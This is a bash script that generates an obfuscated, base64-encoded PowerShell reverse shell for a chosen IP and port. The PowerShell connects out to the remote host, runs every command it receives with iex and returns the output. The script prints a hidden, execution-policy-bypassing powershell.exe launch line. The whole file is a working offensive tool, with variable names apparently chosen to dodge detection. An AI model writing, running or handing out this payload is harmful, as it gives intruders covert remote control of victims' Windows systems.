#!/bin/bash

# Check if two arguments are given (IP and Port)
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 [IP address] [Port]"
    exit 1
fi

# Assign arguments to variables
IP=$1
PORT=$2

# PowerShell script content
PS_SCRIPT="\$cthulhu = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$tntcl = \$cthulhu.GetStream();[byte[]]\$cult = 0..65535|%{0};while((\$i = \$tntcl.Read(\$cult, 0, \$cult.Length)) -ne 0){;\$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$cult,0, \$i);\$ex = (iex \$d 2>&1 | Out-String );\$ex2  = \$ex + 'CF ' + (pwd).Path + '> ';\$shog = ([text.encoding]::ASCII).GetBytes(\$ex2);\$tntcl.Write(\$shog,0,\$shog.Length);\$tntcl.Flush()};"

# Save the PowerShell script to a file
echo "$PS_SCRIPT" > powershellrev.txt

# Convert and encode the script
ENCODED_SHELL=$(iconv -f ASCII -t UTF-16LE powershellrev.txt | base64 | tr -d "\n")

# Print the final PowerShell command
echo "powershell.exe -nop -exec bypass -w hidden -e $ENCODED_SHELL"

